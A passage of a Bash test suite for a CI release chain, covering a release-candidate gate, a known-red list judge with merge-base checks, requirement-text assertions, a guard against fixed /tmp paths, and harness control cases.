  out=$(python3 "$work/rcgate.py" "$f") || rc=$?
  if { [ "$1" = ok ] && [ "$rc" = 0 ]; } || { [ "$1" = caught ] && [ "$rc" != 0 ]; }; then ok "AC12/rc $2${out:+ ($out)}"; else bad "AC12/rc $2 -> $out"; fi; }
rcg ok "the real release.yml has no rc-refusal job and its release job runs on an rc tag (verify-and-stop)"
rcg caught "a release job that excludes an rc tag is caught" "/^  release:/,/^  [a-z]/ s/ \&\& !inputs.dry-run }}/ \&\& !inputs.dry-run \&\& !contains(github.ref_name, '-rc') }}/"
rcg caught "a release job without the dry-run conjunct is caught" '/^  release:/,/^  [a-z]/ s/ \&\& !inputs.dry-run//'
rcg caught "a release job that runs always() (it would run after a failed Check) is caught" '/^  release:/,/^  [a-z]/ s/ if: ${{ startsWith(github.ref, .refs\/tags\/v.) \&\& !inputs.dry-run }}/ if: ${{ always() }}/'
rcg caught "a release job that spells the rc exclusion another way is caught" "/^  release:/,/^  [a-z]/ s/ \&\& !inputs.dry-run }}/ \&\& !inputs.dry-run \&\& !endsWith(github.ref_name, 'rc1') \&\& !contains(github.ref_name, 'rc') }}/"
rcg caught "a restored rc-refusal job is caught" 's/^  patch-failed:/  rc-refusal:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: exit 1\n  patch-failed:/'
# ---- the known-red list (advisor, #299): test-evidence/known-red.json and bin/chain-known-red.py -------------------------------------------------------
# The two chain suites whose red cases are expected (this one and bin/chain-sign-wiring-test.sh) judge their own output against the list: the CI step
# passes only when the set of red cases EQUALS the list. The helper is proven here on synthetic output and a throw-away git repository.
KR="$root/bin/chain-known-red.py"
krj() { # krj WANT-EXIT LABEL FILE-LIST SUITE-OUTPUT-TEXT [FRAGMENT]   (KRJ_RC: the inner suite's exit status, default 1 with a FAIL line, else 0)
  local rc=0 out inner=${KRJ_RC:-}
  [ -n "$inner" ] || { if grep -q '^FAIL ' <<< "$4"; then inner=1; else inner=0; fi; }
  out=$(printf '%s\n' "$4" | python3 "$KR" judge --suite s.sh --list "$3" --inner-rc "$inner" 2>&1) || rc=$?
  if [ "$rc" = "$1" ] && { [ -z "${5:-}" ] || grep -F -q -- "$5" <<< "$out"; }; then ok "known-red $2"; else bad "known-red $2 (exit $rc: ${out:0:160})"; fi; }
mkdir -p "$work/kr"
printf '{"entries":[{"id":"KR-1","suite":"s.sh","case":"the real tree: a","reason":"r","green_by":"PR 3"},{"id":"KR-2","suite":"s.sh","case":"shrink: b","reason":"r","green_by":"P4"},{"id":"KR-9","suite":"other.sh","case":"x","reason":"r","green_by":"P5"}]}\n' > "$work/kr/list.json"
SUM=$'pass=5 fail=2'
krj 0 "the red set equals the list (a case with ' -> ' and one with ': ' details)" "$work/kr/list.json" $'ok   a\nFAIL the real tree: a -> details\nFAIL shrink: b: AC1: more\npass=5 fail=2'
krj 1 "a red case that is not on the list fails and is named" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\nFAIL a new one -> d\npass=5 fail=3' "a new one"
krj 1 "a listed case that now passes fails and is named" "$work/kr/list.json" $'FAIL the real tree: a -> d\npass=5 fail=1' "KR-2"
krj 1 "a suite that printed no summary fails closed" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x' "no \`pass="
krj 1 "an entry of another suite does not cover a red case" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\nFAIL x -> d\npass=1 fail=3' "x"
# the judge does not trust the printed summary (Codex A r4 #2, B F1): fail=M must equal the FAIL lines, each listed case appears ONCE, the inner exit status
# is accounted for, and an entry with `findings` is compared with the structured FINDINGS-JSON line printed right before the case's FAIL line
krj 1 "a summary claiming fail=999 over two FAIL lines is refused" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\npass=0 fail=999' "summary"
krj 1 "a summary claiming fewer failures than FAIL lines is refused" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\npass=0 fail=1' "summary"
krj 1 "a listed case printed twice is refused (each exactly once)" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL the real tree: a -> d\nFAIL shrink: b: x\npass=0 fail=3' "twice"
KRJ_RC=1 krj 1 "a nonzero inner exit with no FAIL line is refused" "$work/kr/list.json" $'pass=5 fail=0' "exit"
KRJ_RC=0 krj 1 "a zero inner exit with FAIL lines is refused" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\npass=0 fail=2' "exit"
KRJ_RC=2 krj 1 "an inner exit status that is neither 0 nor 1 is refused" "$work/kr/list.json" $'FAIL the real tree: a -> d\nFAIL shrink: b: x\npass=0 fail=2' "exit"
rc=0; kout=$(printf 'pass=0 fail=0\n' | python3 "$KR" judge --suite s.sh --list "$work/kr/list.json" 2>&1) || rc=$?
[ "$rc" != 0 ] && grep -q -- '--inner-rc' <<< "$kout" && ok "known-red: a judge call without --inner-rc is refused (the wrapper must pass the inner status)" || bad "known-red: --inner-rc is optional"
printf '{"entries":[{"id":"KS-1","suite":"s.sh","case":"sign: tree","reason":"r","green_by":"P4","findings":["AC1: bin/a.py: names the script x","AC1: bin/b.sh: names the script y","AC1: bin/b.sh: names the script y"]}]}\n' > "$work/kr/struct.json"
FJ() { printf 'FINDINGS-JSON %s\n' "$1"; }
G3='["AC1: bin/a.py: names the script x","AC1: bin/b.sh: names the script y","AC1: bin/b.sh: names the script y"]'
krj 0 "structured: the printed findings equal the entry's (with multiplicity)" "$work/kr/struct.json" "$(FJ "$G3")"$'\nFAIL sign: tree -> text\npass=0 fail=1'
krj 1 "structured: an additional finding behind a matching label is refused" "$work/kr/struct.json" "$(FJ '["AC1: bin/a.py: names the script x","AC1: bin/b.sh: names the script y","AC1: bin/b.sh: names the script y","AC1: bin/c.sh: sets PATH"]')"$'\nFAIL sign: tree -> text\npass=0 fail=1' "c.sh"
krj 1 "structured: a substituted finding is refused" "$work/kr/struct.json" "$(FJ '["AC1: bin/a.py: names the script x","AC1: bin/b.sh: names the script y","AC1: bin/z.sh: names the script y"]')"$'\nFAIL sign: tree -> text\npass=0 fail=1' "z.sh"
krj 1 "structured: fewer occurrences than listed (multiplicity) is refused" "$work/kr/struct.json" "$(FJ '["AC1: bin/a.py: names the script x","AC1: bin/b.sh: names the script y"]')"$'\nFAIL sign: tree -> text\npass=0 fail=1'
krj 1 "structured: B's probe (matching label plus UNEXPECTED text, no structured line) is refused" "$work/kr/struct.json" $'FAIL sign: tree -> UNEXPECTED: unlisted id-token job and non-Sign provenance signer\npass=0 fail=1' "FINDINGS-JSON"
krj 1 "structured: a FINDINGS-JSON line that is not the line before the FAIL line is not used" "$work/kr/struct.json" "$(FJ "$G3")"$'\nok   something\nFAIL sign: tree -> text\npass=1 fail=1' "FINDINGS-JSON"
krj 1 "structured: a FINDINGS-JSON line that is not a JSON list of strings is refused" "$work/kr/struct.json" $'FINDINGS-JSON {"a":1}\nFAIL sign: tree -> text\npass=0 fail=1' "FINDINGS-JSON"
printf '{"entries":[{"id":"K","suite":"s.sh","case":"c"}]}\n' > "$work/kr/bad.json"
krj 1 "an entry without a reason or green_by is refused" "$work/kr/bad.json" $'pass=1 fail=0' "exactly"
printf '{"entries":[{"id":"K","suite":"s.sh","case":"c","reason":"r","green_by":"g"},{"id":"K","suite":"s.sh","case":"d","reason":"r","green_by":"g"}]}\n' > "$work/kr/dup.json"
krj 1 "a duplicate entry id is refused" "$work/kr/dup.json" $'pass=1 fail=0' "twice"
rc=0; python3 "$KR" empty --list "$work/kr/list.json" > /dev/null 2>&1 || rc=$?; [ "$rc" = 1 ] && ok "known-red cutover: a non-empty list fails" || bad "known-red cutover: non-empty list gave exit $rc"
printf '{"entries":[]}\n' > "$work/kr/empty.json"
rc=0; python3 "$KR" empty --list "$work/kr/empty.json" > /dev/null 2>&1 || rc=$?; [ "$rc" = 0 ] && ok "known-red cutover: an empty list passes" || bad "known-red cutover: empty list gave exit $rc"
# cutover prep (advisor Oct 12, REQ-CHAIN-001-AC6): the cutover PR's check is `empty-except KR-CUTOVER` (every other entry gone; KR-CUTOVER alone means "rc proof
# pending"); the marker PR's check stays `empty` (a fully empty list, KR-CUTOVER removed with the marker)
ent() { printf '{"id":"%s","suite":"s.sh","case":"c%s","reason":"r","green_by":"g"}' "$1" "$1"; }
printf '{"entries":[%s]}\n' "$(ent KR-CUTOVER)" > "$work/kr/only-cutover.json"
printf '{"entries":[%s,%s]}\n' "$(ent KR-CUTOVER)" "$(ent KR-OTHER)" > "$work/kr/cutover-other.json"
printf '{"entries":[%s]}\n' "$(ent KR-OTHER)" > "$work/kr/other.json"
krx() { # krx WANT LABEL LIST ARGS... : the exit status of chain-known-red.py empty... (and, for a refusal, the word the first line names)
  local want=$1 label=$2 list=$3 rc=0; shift 3
  python3 "$KR" "$@" --list "$list" > "$work/kr/x.out" 2> "$work/kr/x.err" || rc=$?
  if [ "$rc" = "$want" ] && ! grep -q Traceback "$work/kr/x.err"; then ok "known-red cutover prep: $label"; else bad "known-red cutover prep: $label (exit $rc, wanted $want: $(head -c 150 "$work/kr/x.out" "$work/kr/x.err" | tr '\n' ' '))"; fi; }
krx 0 "empty-except KR-CUTOVER passes when KR-CUTOVER alone is listed (rc proof pending)" "$work/kr/only-cutover.json" empty-except KR-CUTOVER
krx 0 "empty-except KR-CUTOVER passes on an empty list" "$work/kr/empty.json" empty-except KR-CUTOVER
krx 1 "empty-except KR-CUTOVER fails while another entry is listed" "$work/kr/cutover-other.json" empty-except KR-CUTOVER
krx 1 "empty-except KR-CUTOVER fails when another entry alone is listed" "$work/kr/other.json" empty-except KR-CUTOVER
python3 "$KR" empty-except KR-CUTOVER --list "$work/kr/cutover-other.json" > "$work/kr/x.out" 2>&1 || true
grep -F -q KR-OTHER "$work/kr/x.out" && ok "known-red cutover prep: the refusal names the entry that is still listed" || bad "known-red cutover prep: the refusal does not name KR-OTHER"
krx 1 "empty (the marker PR) still fails while KR-CUTOVER alone is listed: the list must be fully empty" "$work/kr/only-cutover.json" empty
krx 2 "empty-except with no entry id is a usage error" "$work/kr/only-cutover.json" empty-except
krx 2 "empty-except with two ids is a usage error" "$work/kr/only-cutover.json" empty-except KR-CUTOVER KR-OTHER
krx 1 "an unreadable list fails closed under empty-except" "$work/kr/does-not-exist.json" empty-except KR-CUTOVER
python3 - "$root/test-evidence/known-red.json" <<'PY' && ok "known-red cutover prep: KR-CUTOVER carries the accepted reason (every OTHER entry gone, this entry alone stays, removed by the marker PR)" || bad "known-red cutover prep: KR-CUTOVER's reason is not the accepted text"
import json, sys
ents = {x["id"]: x for x in json.load(open(sys.argv[1]))["entries"]}
if "KR-CUTOVER" not in ents:        # the marker PR removes the entry (the list is then empty): that completed state is the one this case allows
    sys.exit(0 if not ents else 1)
e = ents["KR-CUTOVER"]
want = ("the cutover pull request (chain-v030 to main) needs every other entry of this list gone AND every hosted check green on hosted runners, not only the suite cases: "
        "build and apk (both legs), scan, reproducibility, allowlist (including every step it skips), pin-age and coverage; this entry alone stays after the cutover and means "
        "'rc proof pending': it is removed by the pull request that commits the marker of REQ-CHAIN-001-AC6, which changes exactly the marker file and the removal of this one entry, and until then no final or patch tag runs the chain")
sys.exit(0 if e["reason"] == want and e["case"].startswith("KNOWN-RED cutover:") else 1)
PY
# REQ-CHAIN-004-AC3, REQ-CHAIN-005-AC1 and REQ-CHAIN-004-AC11 say what the stage files do (advisor T62 text, Oct 12; Codex 4b-3 r1): the installs, and the one apko exception
python3 - "$root/requirements/requirements.yaml" <<'PY' && ok "004-AC3/AC11, 005-AC1 text: each job installs only its tool by the pinned installer line, and AC11's names-apko clause carries exactly that exception" || bad "004-AC3/AC11, 005-AC1 text: the installer wording or AC11's exception is missing"
import sys, yaml
R = {r["id"]: r for r in yaml.safe_load(open(sys.argv[1]))["requirements"]}
def then(rid, n): return next(a for a in R[rid]["acceptance_criteria"] if a["id"] == "%s-AC%d" % (rid, n))["then"]
t3, t11, t5 = then("REQ-CHAIN-004", 3), then("REQ-CHAIN-004", 11), then("REQ-CHAIN-005", 1)
assert "the apk job installs melange only and the assemble job apko only, each by the pinned installer line (`bash bin/install-build-tools.sh melange` or `bash bin/install-build-tools.sh apko`) as one step right after the Witness (and Go) install and so before admission, with no env and no secret" in t3
assert "its apk job installs melange only and its assemble job apko only, as REQ-CHAIN-004-AC3 says of Build" in t5
assert "no stage file or stage script names apko except the one pinned installer line of REQ-CHAIN-004-AC3 (`bash bin/install-build-tools.sh apko`), passes a lock," in t11
assert "no stage file or stage script names apko, passes a lock," not in t11
# the owner's cut-down config rule (ratified Oct 21 2026, ops/docs/ratify/2026-10-21-apko-config-rule-simplified.md): the config sentence is exactly this, with no relative-path and no temporary-copy condition
assert t11.endswith("; apko builds the production and fips images from build/apko.yaml and build/apko-fips.yaml with their lock files"), t11[-200:]
assert "relative path" not in t11 and "temporary copy" not in t11 and "absolute path" not in t11
PY
# REQ-CHAIN-006-AC10, REQ-REL-009-AC1 and REQ-SUP-001-AC1 say what rules 61 and 65 removed and what replaced it (advisor R61 text, Oct 12; the base inputs are one committed list)
python3 - "$root/requirements/requirements.yaml" <<'PY' && ok "006-AC10, REL-009-AC1, SUP-001-AC1 text: no Dockerfile, buildx, goreleaser or Dependabot docker entry; the base inputs are one committed list the decide job prints" || bad "006-AC10, REL-009-AC1, SUP-001-AC1 text: the rule 61 wording is missing"
import sys, yaml
R = {r["id"]: r for r in yaml.safe_load(open(sys.argv[1]))["requirements"]}
def then(rid, n): return next(a for a in R[rid]["acceptance_criteria"] if a["id"] == "%s-AC%d" % (rid, n))["then"]
t10, t9, ts = then("REQ-CHAIN-006", 10), then("REQ-REL-009", 1), then("REQ-SUP-001", 1)
assert "and no .goreleaser.yaml, no build/docker directory or file named Dockerfile and no Dependabot docker entry exists" in t10 and "a candidate image is read by crane, by digest" in t10
assert "a change of a base input listed in .github/policy/base-inputs.json" in t9 and "bin/patch-decide.py base-moved" in t9 and "base-image digest pins" not in t9
assert "no docker entry exists (rule 61: there is no Dockerfile)" in ts and "docker entries are unchanged" not in ts
PY
# an entry added since the merge base is refused unless the PR body names it
kg="$work/kr/repo"; rm -rf "$kg"; mkdir -p "$kg/test-evidence"
( cd "$kg" && git init -q . && git config user.email t@t && git config user.name t && git config commit.gpgsign false \
  && printf '{"entries":[]}\n' > test-evidence/known-red.json && git add -A && git commit -qm base && git tag base \
  && cp "$work/kr/list.json" test-evidence/known-red.json && git add -A && git commit -qm add )
printf '{"pull_request":{"body":"text\\nknown-red-add: KR-1\\nknown-red-add: KR-2\\nknown-red-add: KR-9\\n"}}' > "$work/kr/ev-ok.json"
printf '{"pull_request":{"body":"known-red-add: KR-1\\n"}}' > "$work/kr/ev-part.json"
printf '{"pull_request":{"body":"nothing"}}' > "$work/kr/ev-none.json"
for c in "ok:ev-ok:0" "part:ev-part:1" "none:ev-none:1"; do
  IFS=: read -r nm evf want <<< "$c"; rc=0
  ( cd "$kg" && python3 "$KR" base-check --base base --event "$work/kr/$evf.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
  [ "$rc" = "$want" ] && ok "known-red base-check ($nm): entries added since the merge base need the PR body to name them" || bad "known-red base-check ($nm): exit $rc, wanted $want"
done
# Codex A r5 #1 / B F1: the COMPLETE entry is compared, `findings` included
kf="$work/kr/repo2"; rm -rf "$kf"; mkdir -p "$kf/test-evidence"
( cd "$kf" && git init -q . && git config user.email t@t && git config user.name t && git config commit.gpgsign false \
  && printf '{"entries":[{"id":"KF-1","suite":"s.sh","case":"c","reason":"r","green_by":"g","findings":["f1","f2","f2"]}]}\n' > test-evidence/known-red.json && git add -A && git commit -qm base )
kfchg() { # kfchg NAME PYTHON-EDIT-OF-d  -> a commit that changes the entry; then base-check against HEAD~1 with and without the id in the PR body
  python3 - "$kf/test-evidence/known-red.json" "$2" <<'PY'
import json, sys
p, edit = sys.argv[1:3]; d = json.load(open(p)); e = d["entries"][0]; exec(edit); json.dump(d, open(p, "w"))
PY
  ( cd "$kf" && git add -A && git -c commit.gpgsign=false commit -qm "kf-$1" )
  local rc=0; ( cd "$kf" && python3 "$KR" base-check --base HEAD~1 --event "$work/kr/ev-none.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
  [ "$rc" = 1 ] && ok "known-red base-check: $1 in findings needs the PR body line" || bad "known-red base-check: $1 in findings was accepted without a line (exit $rc)"
  printf '{"pull_request":{"body":"known-red-add: KF-1\\n"}}' > "$work/kr/ev-kf.json"; rc=0
  ( cd "$kf" && python3 "$KR" base-check --base HEAD~1 --event "$work/kr/ev-kf.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
  [ "$rc" = 0 ] && ok "known-red base-check: $1 in findings passes when the PR body names KF-1" || bad "known-red base-check: $1 named but refused (exit $rc)"; }
rc=0; ( cd "$kf" && python3 "$KR" base-check --base HEAD --event "$work/kr/ev-none.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
[ "$rc" = 0 ] && ok "known-red base-check: an unchanged entry that carries findings passes against its own base" || bad "known-red base-check: an unchanged entry with findings was rejected (exit $rc)"
kfchg "an added finding" 'e["findings"].append("f3")'
kfchg "a removed finding" 'e["findings"].remove("f2")'
kfchg "a substituted finding" 'e["findings"][0] = "other"'
kfchg "a reordered finding list" 'e["findings"].reverse()'
rc=0; python3 "$KR" base-check --base HEAD --event "$work/kr/ev-none.json" > /dev/null 2>&1 || rc=$?
[ "$rc" = 0 ] && ok "known-red base-check: the real committed list (entries with findings) passes against its own base" || bad "known-red base-check: the real committed list was rejected against HEAD (exit $rc)"
# an entry kept under its id but changed (suite, case, reason or green_by) is an added entry: it needs its known-red-add line too
cp "$kg/test-evidence/known-red.json" "$work/kr/committed.json"
for fld in case suite reason green_by; do
  python3 - "$kg/test-evidence/known-red.json" "$fld" <<'PY'
import json, sys
p, fld = sys.argv[1:3]
d = json.load(open(p)); d["entries"][0][fld] += " changed"; json.dump(d, open(p, "w"))
PY
  rc=0; ( cd "$kg" && git add -A && git -c commit.gpgsign=false commit -qm "chg-$fld" && python3 "$KR" base-check --base HEAD~1 --event "$work/kr/ev-none.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
  [ "$rc" = 1 ] && ok "known-red base-check: an existing id whose $fld changed counts as added and needs its line" || bad "known-red base-check: a changed $fld under a kept id was not refused (exit $rc)"
done
printf '{"pull_request":{"body":"known-red-add: KR-1\\n"}}' > "$work/kr/ev-kr1.json"
rc=0; ( cd "$kg" && python3 "$KR" base-check --base HEAD~1 --event "$work/kr/ev-kr1.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
[ "$rc" = 0 ] && ok "known-red base-check: a changed entry passes when the PR body names its id" || bad "known-red base-check: a named changed entry gave exit $rc"
rc=0; ( cd "$kg" && python3 "$KR" base-check --base HEAD --event "$work/kr/ev-none.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
[ "$rc" = 0 ] && ok "known-red base-check: no entry added since the base passes without a PR body" || bad "known-red base-check: unchanged list gave exit $rc"
rc=0; ( cd "$kg" && python3 "$KR" base-check --base 0123456789abcdef0123456789abcdef01234567 --event "$work/kr/ev-ok.json" --list test-evidence/known-red.json > /dev/null 2>&1 ) || rc=$?
[ "$rc" = 1 ] && ok "known-red base-check: an unresolvable base fails closed" || bad "known-red base-check: unresolvable base gave exit $rc"
# the committed list and the two suites' own wrapper
rc=0; python3 "$KR" base-check > /dev/null 2>&1 || rc=$?       # CI: the pull request event names the base and the body; locally the base is origin/chain-v030 and KNOWN_RED_ADD names new ids
[ "$rc" = 0 ] && ok "known-red: the committed list is well formed and compares with the base" || bad "known-red: the committed test-evidence/known-red.json (exit $rc)"
for sfile in bin/chain-build-wiring-test.sh bin/chain-sign-wiring-test.sh bin/chain-check-wiring-test.sh bin/chain-records-test.sh; do
  if grep -q 'chain-known-red.py" judge --suite '"$sfile" "$root/$sfile" 2> /dev/null && grep -q -- '--inner-rc' "$root/$sfile" && grep -q 'CHAIN_FINDINGS=1' "$root/$sfile"; then ok "known-red: $sfile judges its own output against the list, with the inner exit status and the structured findings on"; else bad "known-red: $sfile does not judge its output with --inner-rc and CHAIN_FINDINGS=1"; fi
done
# the burn-down (cache4, handoff 0475): the vendor-provenance row landed in chain-scripts.json, so the three entries it kept open are gone. Only KR-CUTOVER may remain, and the marker
# pull request of REQ-CHAIN-001-AC6 removes that one entry too: the committed list is [KR-CUTOVER] now and [] after the marker, nothing else
python3 - "$root/test-evidence/known-red.json" <<'PY' && ok "known-red: the committed list is exactly [KR-CUTOVER] (or [] after the marker pull request): KR-SIGN-1, KR-SIGN-3 and KR-RECORDS-1 are gone with the bin/vendor-provenance.py row in chain-scripts.json" || bad "known-red: the committed list holds a burned-down entry or another id (only KR-CUTOVER, or nothing after the marker, is allowed)"
import json, sys
allowed = lambda ids: ids in ([], ["KR-CUTOVER"])
ids = [x["id"] for x in json.load(open(sys.argv[1]))["entries"]]
assert allowed(ids), ids
assert allowed([]) and allowed(["KR-CUTOVER"])                     # the marker pull request's list (empty) is as valid as today's
for bad_ids in (["KR-CUTOVER", "KR-SIGN-1"], ["KR-SIGN-1"], ["KR-RECORDS-1", "KR-CUTOVER"], ["KR-CUTOVER", "KR-CUTOVER"], ["x"]):
    assert not allowed(bad_ids), bad_ids
PY
# PR 4 (advisor ruling): the records suite's expected failures are ONE entry (KR-RECORDS-1) that names the three cache scripts Release's steps run and that are not
# listed rows yet. The judge accepts exactly those findings, refuses any other (the entry cannot grow silently) and any missing one (it shrinks only by an edit that
# a pull request body names), and the cutover check covers it. The suite's own wrapper prints the findings as structured ids right before its FAIL line.
KRE="bin/vendor-provenance.py"   # since cache#341 (P4) is on main and its rows are listed, the entry is the one finding left: release-sign.sh runs bin/vendor-provenance.py (the vendored-tree PR)
RECCASE="the real repository: every produced record type has a row with a claim and a stage consumer"
recids() { python3 - "$@" <<'PY'
import json, sys
print("FINDINGS-JSON " + json.dumps(["chain-scripts.json: chain-scripts.json: %s runs '%s', which is not listed" % (("bin/release-apks.sh" if "apk" in p else "bin/release-sign.sh"), p) for p in sys.argv[1:]]))
PY
}
# the judge's behaviour on an entry with ONE finding is proven on a fixture list (the committed list no longer holds KR-RECORDS-1, see above)
python3 - "$work/kr-records-list.json" <<'PY'
import json, sys
e = {"id": "KR-RECORDS-1", "suite": "bin/chain-records-test.sh", "case": "the real repository: every produced record type has a row with a claim and a stage consumer", "reason": "fixture: the one script that has no row yet", "green_by": "a row",
     "findings": ["chain-scripts.json: chain-scripts.json: bin/release-sign.sh runs 'bin/vendor-provenance.py', which is not listed"]}
json.dump({"_note": "fixture", "entries": [e]}, open(sys.argv[1], "w"), indent=1)
PY
rec_run() { # rec_run LABEL WANT-EXIT PATHS...  : the records suite's output with those findings, judged against the fixture list
  local label=$1 want=$2 rc=0 out; shift 2
  out=$( { recids "$@"; echo "FAIL $RECCASE -> chain-scripts.json: x"; echo "pass=96 fail=1"; } | python3 "$KR" judge --suite bin/chain-records-test.sh --list "$work/kr-records-list.json" --inner-rc 1 2>&1) || rc=$?
  if [ "$rc" = "$want" ]; then ok "known-red records: $label"; else bad "known-red records: $label (exit $rc, wanted $want: ${out:0:200})"; fi; }
rec_run "exactly the entry's one finding is accepted" 0 bin/vendor-provenance.py
rec_run "a second finding (a script the entry does not name) is refused: the entry cannot grow" 1 bin/vendor-provenance.py bin/other.py
rec_run "a missing finding (the script landed, the entry not shrunk) is refused" 1
rec_run "a different finding of the same size is refused" 1 bin/other.py
# ---- advisor ruling (finding 5): no suite reads or writes a fixed host path under /tmp --------------------------------------------------------------------
# A stray /tmp/x once changed a verdict. Every file a chain suite makes or reads lives in its own mktemp -d ($work). This guard reads the suites' own shell and Python
# text: a redirection, a file command or an open() whose target is a literal /tmp/ path outside any quote is a violation. Fixture TEXT (a workflow or a script held in
# quotes, a command a judge must refuse) is data and is not flagged. The guard is proven on mutated lines, then applied to the suites.
cat > "$work/tmpguard.py" <<'GUARDTXT'
import re, sys
FILE_CMD = r"(?:^|[;&|(]|\bthen\b|\bdo\b)\s*(?:cp|mv|rm|mkdir|touch|tee|cat|ln|chmod|install|sed|head|tail|python3|bash|source)\b[^;&|#]*"
def unquoted(line):
    out, q = [], None
    for i, ch in enumerate(line):
        if q:
            if ch == q: q = None
            out.append(" ")
        elif ch in "\"'": q = ch; out.append(" ")
        else: out.append(ch)
    return "".join(out)
CODE_HEREDOC = {"PY", "PYT", "PYF", "PYEOF", "PYX", "PYJ"}   # a heredoc with one of these delimiters is Python CODE and is read; any other heredoc is data (a workflow text, a script body)
def violations(text):
    bad, end = [], None
    for n, l in enumerate(text.split("\n"), 1):
        if end is not None:
            if l.strip() == end: end = None
            continue
        m = re.search(r"<<-?\s*[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?\s*$", l.rstrip()) or re.search(r"<<-?\s*[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?\s", l)
        if m and m.group(1) not in CODE_HEREDOC and "<<<" not in l:
            end = m.group(1)
        raw = l.strip()
        if raw.startswith("#"): continue
        u = unquoted(l)
        # a literal /tmp path in the UNQUOTED part of the line, as a redirection or an operand of a file command; a "$TMPDIR/..." or "$work/..." is not literal
        if re.search(r"(?:>>?|<|2>)\s*/tmp/\S", u) or re.search(FILE_CMD + r"(?<![\w$])/tmp/\S", u):
            bad.append(n)
        # Python file access to a literal /tmp path: open("/tmp/..."), Path("/tmp/..."), os.makedirs("/tmp/...")
        if re.search(r"\b(?:open|Path|makedirs|mkdir|remove|unlink|rmtree|copy|copyfile|listdir|isfile|exists)\(\s*[rbf]*[\"']/tmp/", l):
            bad.append(n)
    return bad
if sys.argv[1] == "--selftest":
    ok = ["cat > /tmp/x <<EOF", "echo hi > /tmp/leak", "cp a /tmp/b", "rm -f /tmp/x", "python3 - < /tmp/in", 'open("/tmp/x", "w").write("y")', "mkdir -p /tmp/d"]
    fine = ['cat > "$work/x"', "echo '/tmp/x is data'", 'printf "%s" "cp a /tmp/b" > "$work/t"', "# cp a /tmp/b", 'x="$TMPDIR/y"', "d=$(mktemp -d)", 'run "cosign verify <I> > /tmp/x"']
    miss = [l for l in ok if not violations(l)]
    over = [l for l in fine if violations(l)]
    print("; ".join(["not caught: " + m for m in miss] + ["flagged: " + o for o in over]) or "ok"); sys.exit(1 if miss or over else 0)
bad = []
for f in sys.argv[1:]:
    for n in violations(open(f).read()): bad.append("%s:%d" % (f, n))
print("; ".join(bad) or "ok"); sys.exit(1 if bad else 0)
GUARDTXT
out=$(python3 "$work/tmpguard.py" --selftest 2>&1) && ok "no fixed /tmp path: the guard catches redirections, file commands and open() on /tmp and leaves fixture text alone" || bad "no fixed /tmp path: the guard itself is wrong: $out"
out=$(cd "$root" && python3 "$work/tmpguard.py" bin/chain-*-test.sh bin/release-patch-wiring-test.sh bin/install-scanner-test.sh bin/patch-decide-test.sh 2>&1) && ok "no fixed /tmp path: no chain suite reads or writes a literal /tmp path (every file lives in its own mktemp -d)" || bad "no fixed /tmp path: $out"
# the cutover condition, itself expected red until the list is empty (KR-CUTOVER lists this case)
rc=0; python3 "$KR" empty --list "$root/test-evidence/known-red.json" > /dev/null 2>&1 || rc=$?
[ "$rc" = 0 ] && ok "KNOWN-RED cutover: test-evidence/known-red.json lists no expected-red case" || bad "KNOWN-RED cutover: test-evidence/known-red.json lists no expected-red case (still has entries)"
# rules 61 and 62 (advisor Oct 12; REQ-REL-009, the base-input-changed signal): every base input .github/policy/base-inputs.json names is a file of origin/main (the cache lane's
# locks and records). Expected red until the cache lane lands them: KR-BASE-LOCKS lists each one that is not there, so the entry shrinks as they land. A ref that cannot be read
# counts every path as absent (never a pass).
absent=$(python3 - "$root" <<'PY'
import json, subprocess, sys
root = sys.argv[1]
paths = json.load(open(root + "/.github/policy/base-inputs.json"))["base_inputs"]
r = subprocess.run(["git", "-C", root, "ls-tree", "-r", "--name-only", "origin/main", "--"] + paths, capture_output=True, text=True)
have = set(r.stdout.split()) if r.returncode == 0 else set()
print("\n".join(p for p in paths if p not in have))
PY
)
if [ -z "$absent" ]; then ok "KNOWN-RED base locks: every path .github/policy/base-inputs.json lists is a file of origin/main"
else
  printf '%s\n' "$absent" | jq -R '"the base input " + . + " is not on origin/main"' | jq -sc '.' | sed 's/^/FINDINGS-JSON /'
  bad "KNOWN-RED base locks: every path .github/policy/base-inputs.json lists is a file of origin/main"
fi
# the harness itself can fail: (1) a script that ignores a refused admission is visible; (2) a script without its stage-start line fails its cases and the
# summary still prints (a wrong implementation must not abort the test: every counting command above is safe under set -e)
mk "$work/ctl" apk "$work/s-apk.sh" oracle v0.3.0
sed -i.bak 's/^\(python3 -I bin\/build-admit\.py run\)$/\1 || true/' "$work/ctl/bin/build-stage-apk.sh"
rm -f "$work/ctl/bin/build-stage-apk.sh.bak"
rc=$(run_stage "$work/ctl" apk oracle v0.3.0 FAKE_ADMIT_RC=1)
if [ "$rc" = 0 ] || [ "$(n_calls '^apk ' "$work/ctl")" != 0 ]; then
  ok "control: a script that ignores a refused admission is visible to the behaviour cases (exit $rc, a build ran)"
else
  bad "control: the ignoring script was NOT visible (exit $rc)"
fi
grep -v 'stage-start' "$work/s-rebuild-assemble.sh" > "$work/ctl-ra.sh"; before_pass=$pass; before_fail=$failn
beh_rebuild_assemble control "$work/ctl-ra.sh" oracle v0.3.0 > /dev/null
new_fail=$((failn - before_fail)); pass=$before_pass; failn=$before_fail
if [ "$new_fail" -gt 0 ]; then
  ok "control: a rebuild-assemble script without its stage-start line fails $new_fail behaviour cases and the test still reaches its summary"
else
  bad "control: the script without stage-start passed every behaviour case"
fi
# ---- REQ-CHAIN-004-AC14: the proof workflows call Build in snapshot mode and nothing else -------------------------------------------------------------
